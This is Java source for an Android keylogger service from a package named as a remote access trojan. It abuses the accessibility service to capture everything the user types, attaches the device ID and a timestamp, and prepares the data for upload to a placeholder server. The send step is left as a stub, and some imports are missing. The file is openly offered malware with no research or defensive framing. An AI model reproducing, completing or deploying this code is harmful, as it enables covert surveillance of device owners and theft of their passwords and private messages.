package com.vortex.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;

public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private static final String SERVER_URL = "https://your-server.onrender.com/api";
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            if (text != null && !text.isEmpty()) {
                // Send to server
                sendKeylog(text);
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | 
                          AccessibilityEvent.TYPE_VIEW_CLICKED |
                          AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }
    
    private void sendKeylog(String text) {
        // Send to server
        new Thread(() -> {
            try {
                String deviceId = Settings.Secure.getString(
                    getContentResolver(), 
                    Settings.Secure.ANDROID_ID
                );
                
                JSONObject data = new JSONObject();
                data.put("device_id", deviceId);
                data.put("keylog", text);
                data.put("timestamp", System.currentTimeMillis());
                
                // Send to server
                // Use your networking code here
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}